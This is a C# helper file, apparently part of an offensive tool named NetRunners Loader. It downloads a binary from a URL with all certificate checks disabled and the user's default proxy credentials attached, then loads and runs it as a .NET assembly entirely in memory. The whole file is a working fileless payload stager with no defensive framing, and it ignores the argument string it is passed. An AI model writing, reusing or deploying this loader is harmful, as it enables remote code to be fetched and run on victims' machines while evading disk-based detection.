using System;
using System.IO;
using System.Net;
using System.Reflection;

namespace NetRunners.Loader.Helpers
{
    public static class Helpers
    {
        public static byte[] ReadFile(string filePath)
        {
            using (var stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {
                byte[] buffer = new byte[stream.Length];
                stream.Read(buffer, 0, (int)buffer.Length);
                return buffer;
            }
        }

        public static byte[] DownloadBinary(string url)
        {
            // Bypass SSL certificate validation (for self signed certs)
            ServicePointManager.ServerCertificateValidationCallback +=
                (sender, cert, chain, sslPolicyErrors) => true;

            HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create(url);
            myRequest.Proxy.Credentials = CredentialCache.DefaultCredentials;
            myRequest.Method = "GET";
            WebResponse myResponse = myRequest.GetResponse();
            MemoryStream ms = new MemoryStream();
            myResponse.GetResponseStream().CopyTo(ms);
            return ms.ToArray();
        }

        public static void ExecuteBinaryInMemory(byte[] binaryData, string binaryArguments)
        {
            try
            {
                // Load the assembly from the byte array
                Assembly assembly = Assembly.Load(binaryData);

                // Find the entry point of the assembly (e.g., the Main method in a console app)
                MethodInfo entryPoint = assembly.EntryPoint;
                if (entryPoint != null)
                {
                    ParameterInfo[] parameters = entryPoint.GetParameters();
                    object[] args = parameters.Length > 0 ? new object[] { new string[0] } : null; // Adjust if your method expects arguments
                    entryPoint.Invoke(null, args);
                }
                else
                {
                    Console.WriteLine("[-] Entry point not found in the assembly.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] An error occurred while executing the binary in memory: {ex.Message}");
            }
        }
    }
}
